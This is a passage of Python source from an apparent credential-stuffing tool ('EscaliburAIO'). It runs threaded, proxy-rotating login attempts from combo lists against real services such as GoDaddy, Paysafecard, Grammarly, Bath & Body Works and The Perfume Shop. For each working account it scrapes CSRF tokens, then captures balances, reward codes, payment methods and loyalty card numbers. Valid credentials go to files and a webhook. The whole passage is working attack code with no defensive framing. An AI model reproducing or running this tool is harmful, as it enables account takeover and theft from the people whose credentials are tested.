        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="PornPortal"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=PornPortal_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def bathandbody_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
                    "Accept-Language":"en-US,en;q=0.5" ,
                    "Accept-Encoding":"gzip, deflate" ,
                    "DNT":"1" ,
                    "Connection":"close" ,
                    "Upgrade-Insecure-Requests":"1" 
                }
                r = sess.get("https://www.bathandbodyworks.com/my-account", headers=headers)

                idf = search(r' name=\"dwfrm_login_securekey\" value=\"(.*?)\"', str(r.text)).group(1)
                ida = search(r'action=\"https://www.bathandbodyworks.com/my-account?dwcont=(.*?)\"', str(r.text)).group(1)

                url = "https://www.bathandbodyworks.com/my-account?dwcont={}".format(ida) 
                content = "dwfrm_login_username={}&dwfrm_login_password={}&dwfrm_login_securekey={}&dwfrm_login_login=x&format=ajax".format(email, password, idf)

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0" ,
                    "Accept":"*/*" ,
                    "Accept-Language":"en-US,en;q=0.5" ,
                    "Accept-Encoding":"gzip, deflate" ,
                    "X-Requested-With":"XMLHttpRequest" ,
                    "Content-Length":"139" ,
                    "DNT":"1" ,
                    "Connection":"close" ,
                    "Referer":"https://www.bathandbodyworks.com/my-account" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "emailHash" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    headers = {
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" ,
                        "Pragma":"no-cache" ,
                        "Accept":"*/*" 
                    }
                    f = sess.get("https://www.bathandbodyworks.com/on/demandware.store/Sites-BathAndBodyWorks-Site/en_US/Account-IncludeWalletDetails", headers=headers)
                    reward = search(r'data-type=\"REWARD\" data-title=\"(.*?)\"', str(f.text)).group(1)
                    valid = search(r'<span class=\"reward-valid \">(.*?)<', str(f.text)).group(1)
                    reward_code = search(r'<span class=\"reward-code\">(.*?)</span>', str(f.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Reward: {} | Valid-Reward: {} | Reward-Code: {} |\n".format(email, password, reward, valid, reward_code))
                elif "This doesn't match our records" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=bathandbody_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=bathandbody_check, args=(email,password, proxylist,)).start()
    def bathandbody():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Bath&Body Works"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=bathandbody_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def anonfile_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                headers = {
                    "content-type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache"
                }

                content = ""

                f = sess.get("https://anonfile.com/login",data=content, headers=headers)

                csrf = search(r'=\"_token\" value=\"(.*?)\">', str(f.text)).group(1)

                headers = {
                    "content-type":"application/x-www-form-urlencoded", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }
                content = f"email={email}&password={password}&_token={csrf}" 

                r = sess.post("https://anonfile.com/login", headers=headers, data=content)

                if "Invalid email or password." in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Logout" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    abonament = search(r'navbar-text hidden-xs\">(.*?). <a href=\"https', str(f.text)).group(1)
                    open("results/{}/premium.txt".format(today), "a+").write("{}:{} | Subscribtion: {}\n".format(email, password, abonament))
                elif "100 GB free." in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=anonfile_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=anonfile_check, args=(email,password, proxylist,)).start()
    def anonfile():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Anonfile"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=anonfile_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def godaddy_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://sso.godaddy.com/v1/api/idp/login?realm=idp&path=%2Fproducts&app=account" 
                content = {"username":email,"password":password,"remember_me":"false","plid":"1","API_HOST":"godaddy.com"}

                headers = {
                    "Content-Type":"application/json", 
                    "Accept":"application/json", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache"
                }

                r = sess.post(url, json=content, headers=headers)

                if "Username and password did not match" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Ok" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    url = "https://account.godaddy.com/products" 
                    content = ""
                    headers = {
                        "Content-Type":"application/json", 
                        "Accept":"application/json", 
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                        "Pragma":"no-cache" 
                    }
                    f = sess.get(url, data=content, headers=headers)
                    id_x = search(r'shopperId\":\"(.*?)\"', str(f.text)).group(1)
                    token = search(r'csrfToken\":\"(.*?)\",\"cash\":\"', str(f.text)).group(1)
                    url = "https://account.godaddy.com/api/payment-methods"
                    headers = {
                        "Content-Type":"application/json", 
                        "Accept":"application/json, text/javascript, */*; q=0.01", 
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                        "Pragma":"no-cache", 
                        "X-CSRF-Token":token, 
                        "X-Requested-With":"XMLHttpRequest", 
                        "Referer":"https://account.godaddy.com/profile"
                    }
                    content = ""
                    x = sess.get(url, data=content, headers=headers)
                    payment = search(r'paymentMethods\":\[(.*?)\]', str(x.text)).group(1)
                    url = "https://account.godaddy.com/pro-connect-api/shoppers/{}/status".format(id_x)
                    headers = {
                        "Content-Type":"application/x-www-form-urlencoded", 
                        "Accept":"*/*", 
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                        "Pragma":"no-cache" 
                    }
                    content = ""
                    d = sess.get(url, data=content, headers=headers)
                    pro = search(r'{\"code\":\"(.*?)\"', str(d.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Pro: {} | Payment Method: {} |\n".format(email, password, pro, payment))
                else:
                    threading.Thread(target=godaddy_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=godaddy_check, args=(email,password, proxylist,)).start()
    def godaddy():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="GoDaddy"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=godaddy_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def grammarly_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://auth.grammarly.com/v3/api/login" 
                content = {"email_login":{"email":email,"password":password}}

                headers = {
                    "Content-Type":"application/json",
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"application/json" 
                }
                r = sess.post(url, json=content, headers=headers)

                if "{\"user\":{\"id\":\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    subscribtion = search(r'type\":\"(.*?)\"', str(r.text)).group(1)
                    name = search(r'\"name\":\"(.*?)\"', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Subscribtion: {} | Name: {} |\n".format(email, password, subscribtion, name))
                elif "{\"error\":\"FAILURE\"}" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=grammarly_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=grammarly_check, args=(email,password, proxylist,)).start()
    def grammarly():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Grammarly"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=grammarly_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def paysafecard_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://my.paysafecard.com/mypins-psc//login.xhtml"

                content = ""

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "referer":"https://my.paysafecard.com/mypins-psc/", 
                    "origin":"https://my.paysafecard.com" 
                }

                f = sess.get(url, data=content, headers=headers, allow_redirects=True)
                csrf = search(r'<input type=\"hidden\" name=\"javax.faces.ViewState\" id=\"javax.faces.ViewState\" value=\"(.*?)\" autocomplete=\"off\" />', str(f.text)).group(1)

                url = "https://my.paysafecard.com/mypins-psc//login.xhtml"

                content = f"loginForm=loginForm&loginForm%3Ausername={email}&loginForm%3Apassword={password}&loginForm%3AtimeZoneOffset=7200000&loginForm%3Alogin=Connexion&javax.faces.ViewState={csrf}&javax.faces.RenderKitId=HTML5_BASIC"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "referer":"https://my.paysafecard.com/mypins-psc/", 
                    "origin":"https://my.paysafecard.com" 
                }

                r = sess.post(url, data=content, headers=headers, allow_redirects=True)
                if " <div>Numéro de client :" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    sold = search(r'<i class=\"icon icon_balance\"></i>(.*?)EUR', str(r.text)).group(1)
                    pluspoints = search(r'cashPointAmount\">(.*?)</span', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Sold: {} | Plus-Points: {} |\n".format(email, password, sold, pluspoints))
                elif "Veuillez vérifier les champs marqués en rouge" or "Votre connexion a échoué" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "We are sorry, but due to policy restrictions my paysafecard is currently not available and your request could not be processed. Please try again later." in r.text:
                    banned+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/banned.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=paysafecard_check, args=(email,password, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=paysafecard_check, args=(email,password, proxylist,)).start()
    def paysafecard():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="PaySafeCard"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=paysafecard_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def quizizz_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://quizizz.com/auth/local"

                content = {"username":email,"password":password}

                headers = {
                    "Content-Type":"application/json", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"application/json", 
                    "Host":"quizizz.com", 
                    "Origin":"https://quizizz.com", 
                    "Referer":"https://quizizz.com/join" 
                }

                r = sess.post(url, json=content, headers=headers)

                if "{\"success\":true" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    occupation = search(r'occupation\":\"(.*?)\",\"', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Occupation: {} |\n".format(email, password, occupation))
                elif "{\"success\":false" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=quizizz_check, args=(email,password, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=quizizz_check, args=(email,password, proxylist,)).start()
    def quizizz():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Quizizz"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=quizizz_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def pretachanger_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://www.pretachanger.fr/authenticate.php"

                content = f"email={email}&password={password}&referer=https%3A%2F%2Fwww.pretachanger.fr%2F&submit=Se+Connecter" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "origin":"https://www.pretachanger.fr", 
                    "referer":"https://www.pretachanger.fr/signupbox.php", 
                    "upgrade-insecure-requests":"1", 
                    "authority":"www.pretachanger.fr" ,
                    "method":"POST", 
                    "path":"/authenticate.php", 
                    "scheme":"https" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "Porte-monnaie :" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    balance = search(r'myWallet\"><i class=\"fa fa-euro\"></i>Porte-monnaie : (.*?)  € </a></li>', str(r.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Balance: {}\n".format(email, password, balance))
                elif "Désolé, vos identifiants ne sont pas reconnus.</" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=pretachanger_check, args=(email,password, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=pretachanger_check, args=(email,password, proxylist,)).start()
    def pretachanger():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="PretaChanger"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=pretachanger_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def perfumeshop_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

                url = "https://apptps.theperfumeshop.com/rest/oauth/token" 

                content = f"username={email}&password={password}&grant_type=password&client_id=mobile_android&client_secret=secret" 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"okhttp/3.8.0",
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post(url, data=content, headers=headers)

                if "error_description\":\"Bad credentials"  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "access_token" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    token = search(r'access_token\":\"(.*?)\",\"token_type', str(r.text)).group(1)
                    url = "https://apptps.theperfumeshop.com/rest/hybris/customers/current/loyalty"
                    headers = {
                        "User-Agent":"okhttp/3.8.0", 
                        "Pragma":"no-cache",
                        "Accept":"*/*", 
                        "Authorization":f"Bearer {token}" 
                    }
                    f = sess.get(url, headers=headers)
                    cardnumber = search(r'cardNumber\":\"(.*?)\",\"points', str(f.text)).group(1)
                    points = search(r'points\":\"(.*?)\"}', str(f.text)).group(1)
                    open("results/{}/capture.txt".format(today), "a+").write("{}:{} | Points: {} | Card-Number: {} |\n".format(email, password, points, cardnumber))
                else:
                    threading.Thread(target=perfumeshop_check, args=(email,password, proxylist,)).start()
        except:
            errors+=1
            threading.Thread(target=perfumeshop_check, args=(email,password, proxylist,)).start()
    def perfumeshop():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="PerfumeShop"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=perfumeshop_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def ovh_fr_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                

